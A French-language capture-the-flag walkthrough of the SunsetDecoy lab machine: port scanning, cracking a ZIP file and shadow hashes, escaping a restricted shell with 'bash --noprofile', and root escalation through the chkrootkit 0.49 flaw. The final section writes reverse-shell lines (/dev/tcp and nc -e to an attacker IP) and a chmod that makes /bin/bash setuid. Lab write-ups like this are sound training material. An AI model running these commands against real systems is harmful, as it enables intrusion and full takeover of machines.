# SunsetDecoy

	sudo masscan -p1-65535,U:1-65535 192.168.249.85 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 192.168.249.85 -oN nmap.txt
	feroxbuster --silent -u http://192.168.249.85

Scans classiques.

	PORT STATE SERVICE VERSION  
	22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)  
	80/tcp open http Apache httpd 2.4.38

Le site web du port 80 ne contient qu'un fichier ZIP protégé par un mot de passe faible : 

	wget http://192.168.249.85/save.zip
	unzip save.zip
	zip2john save.zip > hash.txt
	john hash.txt
	unzip save.zip

	cat ~/save/etc/passwd
	cat ~/save/etc/shadow

Il y a deux comptes dont on a le hash : root et 296640a3b825115a47b68fc44501c828

	hashcat -m 1800 -a 0 '$6$RucK3DjUUM8TjzYJ$x2etp95bJSiZy6WoJmTd7UomydMfNjo97Heu8nAob9Tji4xzWSzeE0Z2NekZhsyCaA7y/wbzI.2A2xIL/uXV9.' ~/wordlists/rockyou.txt --force
	hashcat -m 1800 -a 0 '$6$x4sSRFte6R6BymAn$zrIOVUCwzMlq54EjDjFJ2kfmuN7x2BjKPdir2Fuc9XRRJEk9FNdPliX4Nr92aWzAtykKih5PX39OKCvJZV0us.' ~/wordlists/rockyou.txt --force

Pas de résultats pour root mais le deuxième compte a bien été cracké.

	ssh 296640a3b825115a47b68fc44501c828@192.168.249.85

On arrive dans un shell restreint, je n'ai pas trouvé de solution facile pour le contourner de l'intérieur. Mais en se reconnectant avec l'option "--noprofile" on peut facilement désactiver ces sécurités.

	exit
	ssh 296640a3b825115a47b68fc44501c828@192.168.249.85 -t "bash --noprofile"
	export PATH=$PATH:/usr/bin:/bin
	cat ../local.txt

### Élévation de privilèges : 

Il y a un exécutable "honeypot.decoy" dans le dossier, qui permet de faire quelques tâches comme afficher un calendrier, lancer un scan antivirus ou redémarrer entre autres. Le code source est également dans le dossier mais n'est pas lisible. Les deux fichiers appartiennent à root.

J'ai décidé d'espionner ce programme avec Pspy et de tester chaque option : 

	ssh 296640a3b825115a47b68fc44501c828@192.168.249.85 -t "bash --noprofile"
	wget http://192.168.45.158/pspy64 
	chmod u+x pspy64
	./pspy64
	==========
	./honeypot.decoy
	...

Après avoir attendu un peu et fait quelques tests, j'ai vu une ligne intéressante passer :

> 2023/07/21 14:01:03 CMD: UID=0 PID=2823 | /bin/sh /root/chkrootkit-0.49/chkrootkit

Voir : https://vk9-sec.com/chkrootkit-0-49-local-privilege-escalation-cve-2014-0476/

	echo "/usr/bin/sh -i >& /dev/tcp/192.168.45.158/443 0>&1" >> /tmp/update
	echo "/usr/bin/nc 192.168.45.158 443 -e /bin/sh" >> /tmp/update
	echo "/usr/bin/chmod 4777 /bin/bash" >> /tmp/update
	==========
	rlwrap nc -nvlp 443
	...
	whoami
	cat /root/proof.txt
